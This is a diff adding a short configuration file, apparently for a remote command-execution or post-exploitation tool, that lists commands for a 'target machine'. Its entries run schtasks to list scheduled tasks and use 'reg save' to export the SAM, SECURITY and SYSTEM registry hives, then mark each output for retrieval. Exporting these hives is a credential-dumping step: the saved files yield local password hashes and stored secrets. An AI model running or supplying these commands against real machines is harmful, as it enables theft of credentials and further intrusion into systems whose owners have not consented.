@@ -1,0 +1,24 @@
+#
+# List the commands to be run on the target machine below. The
+# prefix "cmd.exe /c " will be added to the beginning of every
+# command.
+#
+# Format:
+#
+# CMD_EXEC:<command to run>
+#
+# Example:
+#
+# CMD_EXEC:ipconfig /all > %SYSTEMROOT%\ipconfig.backup
+#
+###############################################################
+
+CMD_EXEC:schtasks /Query /FO LIST /V > %SYSTEMROOT%\schtasks.txt
+CMD_EXEC:reg save HKLM\SAM %SYSTEMROOT%\SAM.backup
+CMD_EXEC:reg save HKLM\SECURITY %SYSTEMROOT%\SECURITY.backup
+CMD_EXEC:reg save HKLM\SYSTEM %SYSTEMROOT%\SYSTEM.backup
+
+SAVE_EXEC:schtasks.txt
+SAVE_EXEC:SAM.backup
+SAVE_EXEC:SECURITY.backup
+SAVE_EXEC:SYSTEM.backup
